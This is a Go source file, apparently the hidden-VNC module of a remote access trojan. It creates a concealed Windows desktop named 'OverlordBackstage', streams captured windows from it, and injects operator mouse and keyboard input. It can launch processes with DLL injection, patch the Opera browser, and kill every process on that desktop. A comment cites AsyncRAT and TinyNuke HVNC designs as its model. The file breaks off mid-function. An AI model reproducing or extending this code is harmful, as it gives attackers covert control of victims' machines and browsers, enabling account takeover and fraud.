//go:build windows

package capture

import (
        "fmt"
        "image"
        "log"
        "math"
        "os"
        "path/filepath"
        "runtime"
        "strings"
        "sync"
        "sync/atomic"
        "syscall"
        "time"
        "unicode/utf8"
        "unsafe"
)

var (
        procCreateDesktopW           = user32.NewProc("CreateDesktopW")
        procOpenDesktopW             = user32.NewProc("OpenDesktopW")
        procCloseDesktop             = user32.NewProc("CloseDesktop")
        procSetThreadDesktop         = user32.NewProc("SetThreadDesktop")
        procGetThreadDesktop         = user32.NewProc("GetThreadDesktop")
        procSwitchDesktop            = user32.NewProc("SwitchDesktop")
        procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
        procGetDesktopWindow         = user32.NewProc("GetDesktopWindow")
        procGetWindowRect            = user32.NewProc("GetWindowRect")
        procIsWindowVisible          = user32.NewProc("IsWindowVisible")
        procPrintWindow              = user32.NewProc("PrintWindow")
        procGetWindow                = user32.NewProc("GetWindow")
        procGetTopWindow             = user32.NewProc("GetTopWindow")
        procCreateProcessW           = kernel32.NewProc("CreateProcessW")
        procGetCursorPosbackstage    = user32.NewProc("GetCursorPos")
        procSetCursorPosbackstage    = user32.NewProc("SetCursorPos")
        procAttachThreadInput        = user32.NewProc("AttachThreadInput")
        procWindowFromPoint          = user32.NewProc("WindowFromPoint")
        procScreenToClient           = user32.NewProc("ScreenToClient")
        procPostMessageW             = user32.NewProc("PostMessageW")
        procSendMessageTimeoutW      = user32.NewProc("SendMessageTimeoutW")
        procSetWindowPos             = user32.NewProc("SetWindowPos")
        procSetForegroundWindow      = user32.NewProc("SetForegroundWindow")
        procSetActiveWindow          = user32.NewProc("SetActiveWindow")
        procSetFocus                 = user32.NewProc("SetFocus")
        procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
        procGetAncestor              = user32.NewProc("GetAncestor")
        procMapVirtualKeyW           = user32.NewProc("MapVirtualKeyW")
        procToUnicode                = user32.NewProc("ToUnicode")
        procGetWindowPlacement       = user32.NewProc("GetWindowPlacement")
        procGetWindowThreadProcessId = user32.NewProc("GetWindowThreadProcessId")
        procEnumDesktopWindows       = user32.NewProc("EnumDesktopWindows")
        procTerminateProcess         = kernel32.NewProc("TerminateProcess")
        procGetWindowLongPtrW        = user32.NewProc("GetWindowLongPtrW")
        procSetWindowLongPtrW        = user32.NewProc("SetWindowLongPtrW")
        procbackstageDblClickTime    = user32.NewProc("GetDoubleClickTime")
        procbackstageMenuItemPoint   = user32.NewProc("MenuItemFromPoint")
        procFindWindowW              = user32.NewProc("FindWindowW")
        procSetProcessDpiAwareCtx    = user32.NewProc("SetProcessDpiAwarenessContext")
        procSetProcessDPIAware       = user32.NewProc("SetProcessDPIAware")
        procGetUserObjectInformationW = user32.NewProc("GetUserObjectInformationW")
        procFindWindowExW            = user32.NewProc("FindWindowExW")
)

const (
        DESKTOP_READOBJECTS     = 0x0001
        DESKTOP_CREATEWINDOW    = 0x0002
        DESKTOP_CREATEMENU      = 0x0004
        DESKTOP_HOOKCONTROL     = 0x0008
        DESKTOP_JOURNALRECORD   = 0x0010
        DESKTOP_JOURNALPLAYBACK = 0x0020
        DESKTOP_ENUMERATE       = 0x0040
        DESKTOP_WRITEOBJECTS    = 0x0080
        DESKTOP_SWITCHDESKTOP   = 0x0100

        GENERIC_ALL = 0x10000000

        DESKTOP_ALL_ACCESS = DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW |
                DESKTOP_CREATEMENU | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD |
                DESKTOP_JOURNALPLAYBACK | DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS |
                DESKTOP_SWITCHDESKTOP | GENERIC_ALL

        GW_HWNDFIRST         = 0
        GW_HWNDLAST          = 1
        GW_HWNDNEXT          = 2
        GW_HWNDPREV          = 3
        PW_RENDERFULLCONTENT = 0x00000002

        STARTF_USESIZE         = 0x00000002
        STARTF_USEPOSITION     = 0x00000004
        CREATE_NEW_CONSOLE     = 0x00000010
        SWP_NOSIZE             = 0x0001
        SWP_NOZORDER           = 0x0004
        SWP_NOACTIVATE         = 0x0010
        SWP_SHOWWINDOW         = 0x0040
        MOUSEEVENTF_MOVE       = 0x0001
        MOUSEEVENTF_LEFTDOWN   = 0x0002
        MOUSEEVENTF_LEFTUP     = 0x0004
        MOUSEEVENTF_RIGHTDOWN  = 0x0008
        MOUSEEVENTF_RIGHTUP    = 0x0010
        MOUSEEVENTF_MIDDLEDOWN = 0x0020
        MOUSEEVENTF_MIDDLEUP   = 0x0040
        MOUSEEVENTF_WHEEL      = 0x0800
        MOUSEEVENTF_ABSOLUTE   = 0x8000
        INPUT_MOUSE            = 0
        INPUT_KEYBOARD         = 1
        KEYEVENTF_KEYUP        = 0x0002
        VK_SHIFT               = 0x10
        VK_CONTROL             = 0x11
        VK_MENU                = 0x12
        VK_CAPITAL             = 0x14
        VK_LSHIFT              = 0xA0
        VK_RSHIFT              = 0xA1
        VK_LCONTROL            = 0xA2
        VK_RCONTROL            = 0xA3
        VK_LMENU               = 0xA4
        VK_RMENU               = 0xA5
        WM_MOUSEMOVE           = 0x0200
        WM_LBUTTONDOWN         = 0x0201
        WM_LBUTTONUP           = 0x0202
        WM_RBUTTONDOWN         = 0x0204
        WM_RBUTTONUP           = 0x0205
        WM_MBUTTONDOWN         = 0x0207
        WM_MBUTTONUP           = 0x0208
        WM_NCHITTEST           = 0x0084
        WM_NCLBUTTONDOWN       = 0x00A1
        WM_NCLBUTTONUP         = 0x00A2
        WM_CLOSE               = 0x0010
        WM_DESTROY             = 0x0002
        WM_SYSCOMMAND          = 0x0112
        WM_KEYDOWN             = 0x0100
        WM_KEYUP               = 0x0101
        WM_CHAR                = 0x0102
        WM_MOUSEWHEEL          = 0x020A
        MK_LBUTTON             = 0x0001
        MK_RBUTTON             = 0x0002
        MK_MBUTTON             = 0x0010
        WHEEL_DELTA            = 120
        HTCAPTION              = 2
        HTCLIENT               = 1
        HTCLOSE                = 20
        HTMINBUTTON            = 8
        HTMAXBUTTON            = 9
        HTLEFT                 = 10
        HTRIGHT                = 11
        HTTOP                  = 12
        HTTOPLEFT              = 13
        HTTOPRIGHT             = 14
        HTBOTTOM               = 15
        HTBOTTOMLEFT           = 16
        HTBOTTOMRIGHT          = 17
        SC_MINIMIZE            = 0xF020
        SC_MAXIMIZE            = 0xF030
        SC_RESTORE             = 0xF120
        SW_SHOWMAXIMIZED       = 3
        GA_ROOT                = 2
        SMTO_ABORTIFHUNG       = 0x0002

        GWL_EXSTYLE      = -20
        WS_EX_TOOLWINDOW = 0x00000080
)

// Real-input constants (bsIn* prefix avoids collisions with other package
// files that may define similar Win32 constants).
const (
        bsInWMActivate      = 0x0006
        bsInWMSetFocus      = 0x0007
        bsInWMNCActivate    = 0x0086
        bsInWAActive        = 1
        bsInWAClickActive   = 2
        bsInMNGetHmenu      = 0x01E1
        bsInMNSelectItem    = 0x01E5
        bsInHTTransparent   = -1
        bsInHTSysMenu       = 3
        bsInHTHScroll       = 6
        bsInHTVScroll       = 7
        bsInWMLButtonDblClk = 0x0203
        bsInWMRButtonDblClk = 0x0206
        bsInWMMButtonDblClk = 0x0209
        bsInVKReturn        = 0x0D
        bsInKeyExt          = 0x0001
        bsInGWLStyle        = uintptr(0xFFFFFFF0) // GWL_STYLE (-16) as raw uintptr
        bsInWSDisabled      = 0x08000000

        bsInMenuClass       = "#32768"
        bsInMinResizeW      = 120
        bsInMinResizeH      = 80
        bsInDblClickPx      = 6
)

var (
        backstageDesktopHandle   uintptr
        backstageDesktopMu       sync.Mutex
        backstageCaptureMu       sync.Mutex
        backstageDesktopName     = "OverlordBackstage"
        backstageInitialized     bool
        backstageOriginalDesktop uintptr
        backstageCursorEnabled   = true // overlay on by default; SetbackstageCursorCapture(false) disables
        backstageThreadOnce      sync.Once
        backstageThreadErr       error
        backstageThreadReady     chan struct{}
        backstageThreadTasks     chan backstageTask
        backstageThreadDone      chan struct{}
        backstageWatchdogOnce    sync.Once
        backstageNoWindowLogNs   atomic.Int64
        backstageInputMu         sync.Mutex
        backstageLastCursor      point
        backstageHasCursor       bool
        backstageWorkingWindow   uintptr
        backstageShiftDown       bool
        backstageCtrlDown        bool
        backstageAltDown         bool
        backstageCapsLock        bool
        backstageMovingWindow    bool
        backstageMoveOffset      point
        backstageWindowSize      point
        backstageWindowToMove    uintptr
        backstageMouseButtons    uint32
        backstagePendingActivate uintptr
        backstageExplorerStarted bool
        backstageTaskSeq         atomic.Uint64
        backstageCurrentTaskID   atomic.Uint64
        backstageCurrentTaskKind atomic.Int64
        backstageCurrentTaskNs   atomic.Int64
        backstageLastScale       atomic.Uint64 // float64 bits — scale used by last backstage capture

        // Capture cache: pooled DC/DIB per window to avoid per-frame allocation
        backstageWinCache      map[uintptr]*backstageWinCacheEntry
        backstageWinCachePrev  []byte
        backstageWinCacheBytes int64
        backstageWinCacheSeq   uint64
        backstageHungWindows   map[uintptr]struct{}

        backstageCompHdcMem uintptr
        backstageCompHbmp   uintptr
        backstageCompBits   unsafe.Pointer
        backstageCompW      int
        backstageCompH      int

        backstagePendingMouseMove *backstageTask
        backstagePendingMoveMu    sync.Mutex

        // Dedicated input thread: mouse/keyboard tasks run on their own locked OS
        // thread so video capture can never delay, reorder or drop operator input.
        backstageInputThreadTasks chan backstageTask
        backstageInputThreadMu    sync.Mutex

        // Guarded by backstageInputMu:
        backstageMenuClickHwnd uintptr
        backstageLastClickMs   int64
        backstageLastClickX    int32
        backstageLastClickY    int32
        backstageLastClickBtn  int
        backstageResizeEdge     int32
        backstageResizeOrig     rect
)

type backstageTaskKind int

const (
        backstageTaskCapture backstageTaskKind = iota
        backstageTaskStartProcess
        backstageTaskStartProcessInjected
        backstageTaskMouseMove
        backstageTaskMouseDown
        backstageTaskMouseUp
        backstageTaskKeyDown
        backstageTaskKeyUp
        backstageTaskMouseWheel
        backstageTaskAutoStartExplorer
        backstageTaskShutdown
)

type backstageTask struct {
        kind            backstageTaskKind
        id              uint64
        display         int
        filePath        string
        x               int32
        y               int32
        button          int
        vk              uint16
        text            string
        delta           int32
        dllBytes        []byte
        searchPath      string
        replacePath     string
        method          string
        queuedAt        time.Time
        resp            chan backstageTaskResult
}

type backstageTaskResult struct {
        img *image.RGBA
        err error
        pid uint32
}

type startupInfo struct {
        cb              uint32
        lpReserved      *uint16
        lpDesktop       *uint16
        lpTitle         *uint16
        dwX             uint32
        dwY             uint32
        dwXSize         uint32
        dwYSize         uint32
        dwXCountChars   uint32
        dwYCountChars   uint32
        dwFillAttribute uint32
        dwFlags         uint32
        wShowWindow     uint16
        cbReserved2     uint16
        lpReserved2     *byte
        hStdInput       uintptr
        hStdOutput      uintptr
        hStdErr         uintptr
}

type processInformation struct {
        hProcess    uintptr
        hThread     uintptr
        dwProcessId uint32
        dwThreadId  uint32
}

type mouseInput struct {
        dx          int32
        dy          int32
        mouseData   uint32
        dwFlags     uint32
        time        uint32
        dwExtraInfo uintptr
}

type backstageWinCacheEntry struct {
        hdcMem uintptr
        hbmp   uintptr
        bits   unsafe.Pointer
        w, h   int
        bytes  int64
        usedAt uint64
        lastOK bool
        age    int
}

const (
        backstageMaxWindowCacheEntries = 64
        backstageMaxWindowCacheBytes   = int64(256 << 20)
        backstagePrintWindowTimeout    = 250 * time.Millisecond
)

type keybdInput struct {
        wVk         uint16
        wScan       uint16
        dwFlags     uint32
        time        uint32
        dwExtraInfo uintptr
}

// input mirrors Win32 INPUT on amd64: type (4) + padding (4) + union (32).
// MOUSEINPUT — the largest union member — is 32 bytes on x64; the previous
// 24-byte union silently truncated it and SendInput rejects a cbSize that
// does not equal sizeof(INPUT), so the size here must stay exact.
type input struct {
        inputType uint32
        _pad      [4]byte
        union     [32]byte
}

func getCurrentThreadId() uint32 {
        r, _, _ := procGetCurrentThreadId.Call()
        return uint32(r)
}

func getThreadDesktop(threadId uint32) uintptr {
        r, _, _ := procGetThreadDesktop.Call(uintptr(threadId))
        return r
}

func isWindowVisible(hwnd uintptr) bool {
        r, _, _ := procIsWindowVisible.Call(hwnd)
        return r != 0
}

func printWindow(hwnd, hdc uintptr, flags uint32) bool {
        r, _, _ := procPrintWindow.Call(hwnd, hdc, uintptr(flags))
        return r != 0
}

func getWindow(hwnd uintptr, cmd uint32) uintptr {
        r, _, _ := procGetWindow.Call(hwnd, uintptr(cmd))
        return r
}

func getTopWindow(hwnd uintptr) uintptr {
        r, _, _ := procGetTopWindow.Call(hwnd)
        return r
}

func InitializebackstageDesktop() error {
        backstageDesktopMu.Lock()
        defer backstageDesktopMu.Unlock()

        if backstageInitialized && backstageDesktopHandle != 0 {
                return nil
        }

        threadId := getCurrentThreadId()
        backstageOriginalDesktop = getThreadDesktop(threadId)

        desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
        if err != nil {
                return fmt.Errorf("failed to convert desktop name: %v", err)
        }

        r, _, _ := procOpenDesktopW.Call(
                uintptr(unsafe.Pointer(desktopNamePtr)),
                0,
                0,
                uintptr(DESKTOP_ALL_ACCESS),
        )

        if r == 0 {
                r, _, err = procCreateDesktopW.Call(
                        uintptr(unsafe.Pointer(desktopNamePtr)),
                        0,
                        0,
                        0,
                        uintptr(DESKTOP_ALL_ACCESS),
                        0,
                )

                if r == 0 {
                        return fmt.Errorf("failed to create hidden desktop: %v", err)
                }
        }

        backstageDesktopHandle = r
        backstageInitialized = true
        return nil
}

func CleanupbackstageDesktop() {
        backstageDesktopMu.Lock()
        defer backstageDesktopMu.Unlock()
        ResetPrevbackstage()
        resetH264D3D11TextureEncoder("backstage")

        dwmCleaned, workerStopped := shutdownbackstageThreadLocked(time.Second)
        if !dwmCleaned {
                backstageAbandonDWMThumbnails()
        }
        backstageStopInputThread()

        // Reset per-session input state (menu click routing, double-click
        // timing, drag latches) so the next session starts clean.
        backstageInputMu.Lock()
        backstageMenuClickHwnd = 0
        backstageLastClickMs = 0
        backstageLastClickBtn = 0
        backstageResizeEdge = 0
        backstageInputMu.Unlock()

        backstageCaptureMu.Lock()

        backstageFreeCapCache()

        backstageClearWindowCache()
        backstageWinCachePrev = nil

        if backstageCompHbmp != 0 {
                deleteObject(backstageCompHbmp)
                backstageCompHbmp = 0
        }
        if backstageCompHdcMem != 0 {
                deleteDC(backstageCompHdcMem)
                backstageCompHdcMem = 0
        }
        backstageCompBits = nil
        backstageCompW = 0
        backstageCompH = 0
        backstageCaptureMu.Unlock()

        backstageInputMu.Lock()
        backstageShiftDown = false
        backstageCtrlDown = false
        backstageAltDown = false
        backstageCapsLock = false
        backstageMouseButtons = 0
        backstageHasCursor = false
        backstageWorkingWindow = 0
        backstageInputMu.Unlock()
        backstageLastScale.Store(0)

        if backstageDesktopHandle != 0 && workerStopped {
                procCloseDesktop.Call(backstageDesktopHandle)
        }
        backstageDesktopHandle = 0
        backstageInitialized = false
        backstageExplorerStarted = false

        uiaCleanup()
        uiaClearActiveElement()
        resetWinUI3Cache()
        resetInputSiteCache()

        backstageThreadTasks = nil
        backstageThreadReady = nil
        backstageThreadDone = nil
        backstageThreadErr = nil
        backstageThreadOnce = sync.Once{}
        backstageWatchdogOnce = sync.Once{}
}

func shutdownbackstageThreadLocked(timeout time.Duration) (dwmCleaned, stopped bool) {
        tasks := backstageThreadTasks
        done := backstageThreadDone
        if tasks == nil || done == nil {
                return false, true
        }
        if timeout <= 0 {
                timeout = time.Second
        }
        resp := make(chan backstageTaskResult, 1)
        task := backstageTask{kind: backstageTaskShutdown, resp: resp, id: backstageTaskSeq.Add(1), queuedAt: time.Now()}
        timer := time.NewTimer(timeout)
        defer timer.Stop()
        select {
        case tasks <- task:
        case <-done:
                return false, true
        case <-timer.C:
                log.Printf("backstage cleanup: worker shutdown enqueue timed out")
                return false, false
        }
        select {
        case result := <-resp:
                dwmCleaned = result.err == nil
        case <-done:
        case <-timer.C:
                log.Printf("backstage cleanup: worker shutdown timed out")
                return false, false
        }
        select {
        case <-done:
                return dwmCleaned, true
        case <-timer.C:
                log.Printf("backstage cleanup: worker exit timed out")
                return dwmCleaned, false
        }
}

// backstageStopInputThread hands the input thread a shutdown task so it can
// release its locked OS thread and desktop attachment instead of leaking on
// every backstage session teardown.
func backstageStopInputThread() {
        backstageInputThreadMu.Lock()
        inputTasks := backstageInputThreadTasks
        backstageInputThreadTasks = nil
        backstageInputThreadMu.Unlock()
        if inputTasks == nil {
                return
        }
        resp := make(chan backstageTaskResult, 1)
        poison := backstageTask{kind: backstageTaskShutdown, resp: resp, id: backstageTaskSeq.Add(1), queuedAt: time.Now()}
        select {
        case inputTasks <- poison:
        case <-time.After(2 * time.Second):
                log.Printf("backstage cleanup: input thread stop enqueue timed out")
        }
}

func SetbackstageCursorCapture(enabled bool) {
        backstageCursorEnabled = enabled
}

func backstageDesktopBounds() (image.Rectangle, bool) {
        hwnd, _, _ := procGetDesktopWindow.Call()
        if hwnd == 0 {
                return image.Rectangle{}, false
        }
        var r rect
        ok, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&r)))
        if ok == 0 {
                return image.Rectangle{}, false
        }
        if r.right <= r.left || r.bottom <= r.top {
                return image.Rectangle{}, false
        }
        return image.Rect(int(r.left), int(r.top), int(r.right), int(r.bottom)), true
}

func ensurebackstageThread() error {
        backstageDesktopMu.Lock()
        desktopHandle := backstageDesktopHandle
        backstageDesktopMu.Unlock()

        if desktopHandle == 0 {
                return fmt.Errorf("backstage desktop not initialized")
        }

        backstageThreadOnce.Do(func() {
                ready := make(chan struct{})
                tasks := make(chan backstageTask)
                done := make(chan struct{})
                backstageThreadReady = ready
                backstageThreadTasks = tasks
                backstageThreadDone = done
                backstageWatchdogOnce.Do(func() {
                        go func() {
                                defer recoverAndLog("backstage watchdog", nil)
                                backstageThreadWatchdog()
                        }()
                })
                go func(handle, originalDesktop uintptr) {
                        defer recoverAndLog("backstage desktop thread", nil)
                        runtime.LockOSThread()
                        defer func() {
                                if originalDesktop != 0 {
                                        procSetThreadDesktop.Call(originalDesktop)
                                }
                                close(done)
                                runtime.UnlockOSThread()
                        }()

                        r, _, err := procSetThreadDesktop.Call(handle)
                        if r == 0 {
                                backstageThreadErr = fmt.Errorf("failed to set thread desktop: %v", err)
                                close(ready)
                                return
                        }

                        ourTid, _, _ := procGetCurrentThreadId.Call()
                        backstageLogf("%s: engine thread attached to desktop %q — ready", backstageInputEngineVersion, backstageDesktopNameOfThread(uint32(ourTid)))
                        close(ready)
                        for task := range tasks {
                                start := time.Now()
                                backstageCurrentTaskID.Store(task.id)
                                backstageCurrentTaskKind.Store(int64(task.kind))
                                backstageCurrentTaskNs.Store(start.UnixNano())

                                if shouldTracebackstageTask(task.kind) {
                                        log.Printf("backstage task: start id=%d kind=%s queued=%s details=%s", task.id, backstageTaskKindName(task.kind), start.Sub(task.queuedAt).Round(time.Millisecond), backstageTaskDetails(task))
                                }

                                var result backstageTaskResult
                                switch task.kind {
                                case backstageTaskStartProcess:
                                        result.pid, result.err = startbackstageProcessOnThread(task.filePath, task.display)
                                case backstageTaskStartProcessInjected:
                                        result.pid, result.err = startbackstageProcessInjectedOnThread(task.filePath, task.dllBytes, task.searchPath, task.replacePath, task.display, task.method)
                                case backstageTaskMouseMove:
                                        result.err = backstageMouseMoveOnThread(task.display, task.x, task.y)
                                case backstageTaskMouseDown:
                                        result.err = backstageMouseButtonOnThread(task.button, true)
                                case backstageTaskMouseUp:
                                        result.err = backstageMouseButtonOnThread(task.button, false)
                                case backstageTaskKeyDown:
                                        result.err = backstageKeyOnThread(task.vk, task.text, true)
                                case backstageTaskKeyUp:
                                        result.err = backstageKeyOnThread(task.vk, "", false)
                                case backstageTaskMouseWheel:
                                        result.err = backstageMouseWheelOnThread(task.delta)
                                case backstageTaskAutoStartExplorer:
                                        result.err = backstageAutoStartExplorerOnThread()
                                case backstageTaskShutdown:
                                        backstageCleanupDWMThumbnails()
                                default:
                                        result.img, result.err = BackstageCaptureDisplayOnThread(task.display)
                                }

                                dur := time.Since(start)
                                if shouldTracebackstageTask(task.kind) || dur > 400*time.Millisecond {
                                        if result.err != nil {
                                                log.Printf("backstage task: done id=%d kind=%s dur=%s err=%v", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond), result.err)
                                        } else {
                                                log.Printf("backstage task: done id=%d kind=%s dur=%s", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond))
                                        }
                                }

                                backstageCurrentTaskNs.Store(0)
                                backstageCurrentTaskKind.Store(-1)
                                backstageCurrentTaskID.Store(0)
                                task.resp <- result
                                if task.kind == backstageTaskShutdown {
                                        return
                                }
                        }
                }(desktopHandle, backstageOriginalDesktop)

                // Dedicated input thread: mouse/keyboard tasks
                // run on their own locked OS thread attached to
                // the backstage desktop so operator input can
                // never queue behind video-capture work.
                inputTasks := make(chan backstageTask)
                backstageInputThreadMu.Lock()
                backstageInputThreadTasks = inputTasks
                backstageInputThreadMu.Unlock()
                go func(handle, originalDesktop uintptr) {
                        defer recoverAndLog("backstage input thread", nil)
                        runtime.LockOSThread()
                        defer func() {
                                if originalDesktop != 0 {
                                        procSetThreadDesktop.Call(originalDesktop)
                                }
                                runtime.UnlockOSThread()
                        }()

                        runInputTask := func(task *backstageTask) {
                                start := time.Now()
                                backstageCurrentTaskID.Store(task.id)
                                backstageCurrentTaskKind.Store(int64(task.kind))
                                backstageCurrentTaskNs.Store(start.UnixNano())
                                if shouldTracebackstageTask(task.kind) {
                                        log.Printf("backstage input task: start id=%d kind=%s queued=%s details=%s", task.id, backstageTaskKindName(task.kind), start.Sub(task.queuedAt).Round(time.Millisecond), backstageTaskDetails(*task))
                                }
                                var result backstageTaskResult
                                switch task.kind {
                                case backstageTaskMouseMove:
                                        result.err = backstageMouseMoveOnThread(task.display, task.x, task.y)
                                case backstageTaskMouseDown:
                                        result.err = backstageMouseButtonOnThread(task.button, true)
                                case backstageTaskMouseUp:
                                        result.err = backstageMouseButtonOnThread(task.button, false)
                                case backstageTaskKeyDown:
                                        result.err = backstageKeyOnThread(task.vk, task.text, true)
                                case backstageTaskKeyUp:
                                        result.err = backstageKeyOnThread(task.vk, "", false)
                                case backstageTaskMouseWheel:
                                        result.err = backstageMouseWheelOnThread(task.delta)
                                default:
                                        result.err = fmt.Errorf("backstage input thread: unsupported task kind %d", task.kind)
                                }
                                dur := time.Since(start)
                                if shouldTracebackstageTask(task.kind) || dur > 400*time.Millisecond {
                                        if result.err != nil {
                                                log.Printf("backstage input task: done id=%d kind=%s dur=%s err=%v", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond), result.err)
                                        } else {
                                                log.Printf("backstage input task: done id=%d kind=%s dur=%s", task.id, backstageTaskKindName(task.kind), dur.Round(time.Millisecond))
                                        }
                                }
                                backstageCurrentTaskNs.Store(0)
                                backstageCurrentTaskKind.Store(-1)
                                backstageCurrentTaskID.Store(0)
                                if task.resp != nil {
                                        task.resp <- result
                                }
                        }

                        r, _, err := procSetThreadDesktop.Call(handle)
                        if r == 0 {
                                log.Printf("backstage input thread: SetThreadDesktop failed: %v — rejecting input tasks", err)
                                for task := range inputTasks {
                                        if task.resp != nil {
                                                task.resp <- backstageTaskResult{err: fmt.Errorf("backstage input thread unavailable: %v", err)}
                                        }
                                }
                                return
                        }

                        // NOTE: SendInput can NEVER deliver input on a hidden
                        // desktop. The kernel gates NtUserSendInput on
                        // IntIsActiveDesktop(pti->rpdesk) and fails with
                        // ERROR_ACCESS_DENIED unless the calling thread's
                        // desktop IS the active input desktop — a hidden
                        // desktop never is. All input therefore goes through
                        // the hardened message-emulation engine below, the
                        // same design the field-proven HVNC implementations
                        // (AsyncRAT/TinyNuke family) rely on.
                        log.Printf("backstage input: hardened message emulation active on hidden desktop")

                        for task := range inputTasks {
                                if task.kind == backstageTaskShutdown {
                                        if task.resp != nil {
                                                task.resp <- backstageTaskResult{}
                                        }
                                        return
                                }
                                if task.kind != backstageTaskMouseMove {
                                        runInputTask(&task)
                                        continue
                                }
                                // Coalesce bursts of queued mouse moves
                                // into the newest one so a dragged cursor
                                // cannot flood the input thread and delay
                                // clicks queued behind it.
                                latest := &task
                                var held *backstageTask
                        coalesceLoop:
                                for {
                                        select {
                                        case nt, ok := <-inputTasks:
                                                if !ok {
                                                        break coalesceLoop
                                                }
                                                if nt.kind == backstageTaskMouseMove {
                                                        if nt.resp != nil {
                                                                nt.resp <- backstageTaskResult{}
                                                        }
                                                        latest = &nt
                                                        continue
                                                }
                                                held = &nt
                                                break coalesceLoop
                                        default:
                                                break coalesceLoop
                                        }
                                }
                                runInputTask(latest)
                                if held != nil {
                                        if held.kind == backstageTaskShutdown {
                                                if held.resp != nil {
                                                        held.resp <- backstageTaskResult{}
                                                }
                                                return
                                        }
                                        runInputTask(held)
                                }
                        }
                }(desktopHandle, backstageOriginalDesktop)
        })

        if backstageThreadReady != nil {
                <-backstageThreadReady
        }

        return backstageThreadErr
}

func BackstageCaptureDisplay(display int) (*image.RGBA, error) {
        if err := ensurebackstageThread(); err != nil {
                return nil, err
        }

        resp := make(chan backstageTaskResult, 1)
        task := backstageTask{
                kind:     backstageTaskCapture,
                display:  display,
                resp:     resp,
                id:       backstageTaskSeq.Add(1),
                queuedAt: time.Now(),
        }
        // Bounded wait: without a timeout a stuck capture (hung window
        // walk, wedged DC) would block the frame pump forever.
        timer := time.NewTimer(10 * time.Second)
        defer timer.Stop()
        select {
        case backstageThreadTasks <- task:
        case <-timer.C:
                return nil, fmt.Errorf("backstage capture queue timed out")
        }
        select {
        case result := <-resp:
                return result.img, result.err
        case <-timer.C:
                return nil, fmt.Errorf("backstage capture timed out")
        }
}

func StartbackstageProcess(filePath string, operaPatch bool, display int) error {
        if filePath == "" {
                return fmt.Errorf("empty file path")
        }
        result, err := executebackstageTask(backstageTask{
                kind:     backstageTaskStartProcess,
                filePath: strings.TrimSpace(filePath),
                display:  display,
        }, 10*time.Second)
        if err != nil {
                return err
        }
        if result.err != nil {
                return result.err
        }
        if operaPatch && result.pid != 0 {
                go func() {
                        defer recoverAndLog("backstage patch opera", nil)
                        patchOperaAsync(result.pid, 5, 2*time.Second)
                }()
        }
        return nil
}

func BackstageKillAll() error {
        backstageDesktopMu.Lock()
        deskHandle := backstageDesktopHandle
        backstageDesktopMu.Unlock()
        if deskHandle == 0 {
                return fmt.Errorf("backstage desktop not initialized")
        }

        currentPID := uint32(os.Getpid())
        pids := make(map[uint32]struct{})
        cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
                if backstageIsDWMHost(hwnd) {
                        return 1
                }
                var pid uint32
                procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
                if backstageShouldKillPID(pid, currentPID) {
                        pids[pid] = struct{}{}
                }
                return 1 // continue enumeration
        })
        procEnumDesktopWindows.Call(deskHandle, cb, 0)

        const PROCESS_TERMINATE = 0x0001
        killed := 0
        for pid := range pids {
                hProc, _, _ := procOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
                if hProc != 0 {
                        procTerminateProcess.Call(hProc, 1)
                        kernel32.NewProc("CloseHandle").Call(hProc)
                        killed++
                }
        }
        log.Printf("backstage: kill all: terminated %d processes across %d pids", killed, len(pids))
        return nil
}

func backstageShouldKillPID(pid, currentPID uint32) bool {
        return pid != 0 && pid != currentPID
}

func BackstageAutoStartExplorer() error {
        if backstageExplorerStarted {
                return nil
        }
        result, err := executebackstageTask(backstageTask{
                kind: backstageTaskAutoStartExplorer,
        }, 15*time.Second)
        if err != nil {
                return err
        }
        return result.err
}

func BackstageInputMouseMove(display int, x, y int32) error {
        result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseMove, display: display, x: x, y: y}, 3*time.Second)
        if err != nil {
                return err
        }
        return result.err
}

func BackstageInputMouseDown(button int) error {
        result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseDown, button: button}, 3*time.Second)
        if err != nil {
                return err
        }
        return result.err
}

func BackstageInputMouseUp(button int) error {
        result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseUp, button: button}, 3*time.Second)
        if err != nil {
                return err
        }
        return result.err
}

func BackstageInputKeyDown(vk uint16, text string) error {
        result, err := executebackstageTask(backstageTask{kind: backstageTaskKeyDown, vk: vk, text: printableKeyText(text)}, 3*time.Second)
        if err != nil {
                return err
        }
        return result.err
}

func BackstageInputKeyUp(vk uint16) error {
        result, err := executebackstageTask(backstageTask{kind: backstageTaskKeyUp, vk: vk}, 3*time.Second)
        if err != nil {
                return err
        }
        return result.err
}

func BackstageInputMouseWheel(delta int32) error {
        result, err := executebackstageTask(backstageTask{kind: backstageTaskMouseWheel, delta: delta}, 3*time.Second)
        if err != nil {
                return err
        }
        return result.err
}

func isbackstageInputKind(kind backstageTaskKind) bool {
        switch kind {
        case backstageTaskMouseMove, backstageTaskMouseDown, backstageTaskMouseUp,
                backstageTaskKeyDown, backstageTaskKeyUp, backstageTaskMouseWheel:
                return true
        default:
                return false
        }
}

func executebackstageTask(task backstageTask, timeout time.Duration) (backstageTaskResult, error) {
        if err := ensurebackstageThread(); err != nil {
                return backstageTaskResult{}, err
        }
        if backstageThreadTasks == nil {
                return backstageTaskResult{}, fmt.Errorf("backstage thread not available")
        }
        // Input tasks go to the dedicated input thread; everything else
        // (capture, process launch, shutdown) stays on the capture worker.
        backstageInputThreadMu.Lock()
        inputTasks := backstageInputThreadTasks
        backstageInputThreadMu.Unlock()
        target := backstageThreadTasks
        if inputTasks != nil && isbackstageInputKind(task.kind) {
                target = inputTasks
        }
        if timeout <= 0 {
                timeout = 3 * time.Second
        }

        task.resp = make(chan backstageTaskResult, 1)
        task.id = backstageTaskSeq.Add(1)
        task.queuedAt = time.Now()
        timer := time.NewTimer(timeout)
        defer timer.Stop()

        select {
        case target <- task:
